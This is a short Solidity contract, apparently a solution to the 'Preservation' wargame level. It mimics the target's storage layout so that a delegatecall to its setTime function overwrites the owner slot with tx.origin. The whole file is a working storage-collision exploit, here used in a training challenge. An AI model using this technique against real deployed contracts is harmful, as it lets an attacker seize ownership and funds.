// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
  address public timeZone1Library;
  address public timeZone2Library;
  address public theowner; 
  uint storedTime;

  function setTime(uint _time) public {
    theowner = tx.origin;
  }
}